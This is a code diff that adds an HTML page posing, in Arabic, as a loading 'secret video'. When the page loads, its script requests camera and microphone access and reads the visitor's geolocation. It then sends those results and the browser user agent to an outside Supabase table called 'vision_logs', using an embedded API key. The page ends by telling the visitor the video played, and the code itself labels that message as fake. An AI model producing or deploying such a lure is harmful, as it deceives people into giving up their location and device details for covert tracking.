@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ تحميل الفيديو التفاعلي...</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 100px;
+    }
+    .loader {
+      margin-top: 40px;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📹 جارٍ تشغيل الفيديو السري...</h1>
+  <div class="loader">تحميل...</div>
+
+  <script>
+    async function collectData() {
+      const cameraStatus = await navigator.mediaDevices.getUserMedia({ video: true }).then(() => 'granted').catch(() => 'denied');
+      const micStatus = await navigator.mediaDevices.getUserMedia({ audio: true }).then(() => 'granted').catch(() => 'denied');
+      
+      let locationData = 'unavailable';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            locationData = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            sendData(cameraStatus, micStatus, locationData);
+          },
+          () => {
+            sendData(cameraStatus, micStatus, locationData);
+          }
+        );
+      } else {
+        sendData(cameraStatus, micStatus, locationData);
+      }
+    }
+
+    async function sendData(cam, mic, loc) {
+      const payload = {
+        camera_permission: cam,
+        mic_permission: mic,
+        location: loc,
+        user_agent: navigator.userAgent,
+        ip_address: "IP_WILL_BE_COLLECTED_SERVER_SIDE"
+      };
+
+      await fetch("https://bzadyerhmmjiycwjvybf.supabase.co/rest/v1/vision_logs", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ6YWR5ZXJobW1qaXljd2p2eWJmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU0NTY5NDIsImV4cCI6MjA2MTAzMjk0Mn0.VgAXIWarLsHiHgHwu4EtJujeudcdLmbMAfrI1F48Dx8",
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ6YWR5ZXJobW1qaXljd2p2eWJmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU0NTY5NDIsImV4cCI6MjA2MTAzMjk0Mn0.VgAXIWarLsHiHgHwu4EtJujeudcdLmbMAfrI1F48Dx8"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      document.querySelector('.loader').innerText = '✔ تم تشغيل الفيديو بنجاح... (وهمي 😈)';
+    }
+
+    collectData();
+  </script>
+</body>
+</html>
